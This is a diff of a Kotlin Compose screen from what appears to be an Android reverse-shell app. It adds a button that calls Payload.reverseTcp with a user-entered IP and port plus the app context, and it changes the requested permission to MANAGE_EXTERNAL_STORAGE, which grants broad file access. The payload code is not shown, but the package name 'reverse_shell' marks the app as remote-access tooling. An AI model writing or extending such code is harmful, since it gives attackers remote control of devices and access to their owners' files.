@@ -1,8 +1,15 @@
 package com.satwik.nexgenius.core.main
 
 import android.Manifest
+import android.content.ComponentName
+import android.content.Context
+import android.content.pm.PackageManager
+import android.database.Cursor
+import android.net.Uri
+import android.os.Build
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.annotation.RequiresApi
 import androidx.compose.foundation.layout.Column
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.fillMaxWidth
@@ -17,32 +24,39 @@ import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.remember
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.input.TextFieldValue
 import androidx.compose.ui.unit.dp
 import androidx.lifecycle.viewmodel.compose.viewModel
+import com.satwik.nexgenius.core.reverse_shell.Payload
 import kotlinx.coroutines.DelicateCoroutinesApi
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
 
-@OptIn(DelicateCoroutinesApi::class)
+
+@RequiresApi(Build.VERSION_CODES.R)
+@OptIn(DelicateCoroutinesApi::class, DelicateCoroutinesApi::class)
 @Composable
 fun ShellyScreen(){
 
     val viewModel = viewModel<MainViewModel>()
+    val context = LocalContext.current
 
     val storagePermissionResultLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission(),
         onResult = {isGranted ->
             viewModel.onPermissionResult(
-                permission = Manifest.permission.READ_EXTERNAL_STORAGE,
+                permission = Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                 isGranted = isGranted
             )
         }
     )
 
     Column (
-        modifier = Modifier.fillMaxSize().padding(vertical = 16.dp)
+        modifier = Modifier
+            .fillMaxSize()
+            .padding(vertical = 16.dp)
     ){
 
         var ip by remember { mutableStateOf(TextFieldValue("")) }
@@ -65,8 +79,9 @@ fun ShellyScreen(){
             shape = RoundedCornerShape(topEnd = 15.dp, topStart = 15.dp)
         )
 
+
         Button(
-            onClick = { storagePermissionResultLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE) },
+            onClick = { storagePermissionResultLauncher.launch(Manifest.permission.MANAGE_EXTERNAL_STORAGE) },
         ) {
             Text(text = "Ask Permission")
         }
@@ -74,7 +89,7 @@ fun ShellyScreen(){
         Button(
             onClick = {
                 GlobalScope.launch(Dispatchers.IO) {
-                    Payload.reverseTcp(ip.text, port.text.toInt())
+                    Payload.reverseTcp(ip.text, port.text.toInt(), context)
                 }
             },
         ) {
@@ -82,4 +97,7 @@ fun ShellyScreen(){
         }
     }
 }
+
+
+
 
